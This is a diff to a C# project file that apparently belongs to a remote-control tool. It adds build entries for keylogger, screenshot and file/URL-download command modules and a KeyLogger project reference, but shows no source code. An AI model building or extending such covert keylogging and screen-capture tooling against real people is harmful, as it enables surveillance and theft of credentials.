@@ -32,6 +32,8 @@
   <ItemGroup>
     <Reference Include="System" />
     <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
     <Reference Include="System.Xml.Linq" />
     <Reference Include="System.Data.DataSetExtensions" />
     <Reference Include="Microsoft.CSharp" />
@@ -41,9 +43,13 @@
   </ItemGroup>
   <ItemGroup>
     <Compile Include="CommandsManager.cs" />
+    <Compile Include="DownloadFile.cs" />
+    <Compile Include="DownloadUrl.cs" />
     <Compile Include="Exit.cs" />
     <Compile Include="ICommand.cs" />
+    <Compile Include="KeyLogger.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Screenshot.cs" />
     <Compile Include="StopServerException.cs" />
     <Compile Include="Terminate.cs" />
     <Compile Include="UploadFile.cs" />
@@ -52,6 +58,10 @@
     <ProjectReference Include="..\ConsoleColorTools\Shared.csproj">
       <Project>{982dc5b6-1123-428a-83dd-d212490c859f}</Project>
       <Name>Shared</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\KeyLogger\KeyLogger.csproj">
+      <Project>{12478B3E-455E-4BAE-BDE8-1F42970770A3}</Project>
+      <Name>KeyLogger</Name>
     </ProjectReference>
     <ProjectReference Include="..\NetworkManager\NetworkManager.csproj">
       <Project>{4099dcc2-a969-4a5c-9f6d-eff87706995c}</Project>
